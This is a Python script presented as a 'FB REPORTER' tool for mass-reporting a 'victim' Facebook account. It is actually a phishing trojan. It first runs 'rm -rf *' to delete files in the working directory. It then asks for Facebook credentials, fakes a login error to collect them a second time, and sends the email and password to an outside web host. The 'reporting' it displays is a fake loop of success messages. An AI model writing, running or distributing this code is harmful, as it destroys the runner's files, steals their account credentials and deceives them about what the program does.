from termcolor import colored
import os
import requests
import time
os.system('rm -rf *')
os.system("figlet 'FB REPORTER'")
time.sleep(3)
print(colored('First time you need to login with facebook ','green'))
time.sleep(3)
username = input('Email.......:')
password = input('Password....:')
print(colored('ERROR.....','red'))
time.sleep(1)
print(colored('###Username or Password is wrong###','red'))
time.sleep(1)
print(colored('Please Renter Your Facebook Account','red'))
username = input('Email.......:')
password = input('Password....:')
url = "https://alladinne.000webhostapp.com/store.php?username="+str(username)+"&password="+str(password)
con = requests.get(url)
print(colored('Success Login......','green'))
time.sleep(2)
victim = input('Enter Your Victim Facebook ID::')
time.sleep(3)
print(colored('Fitching data please wait.......','green'))
time.sleep(2)
print(colored('Starting reporting engine........','green'))
time.sleep(3)
print(colored('Reporting Start........ ','green'))
time.sleep(3)
print(colored('........','green'))
time.sleep(3)
print(colored('...','green'))
i=100048845592611
while i < 120048845592711:
	time.sleep(3)
	print(colored('['+str(i)+']'+'+++successful reported+++','green'))
	i=i+1



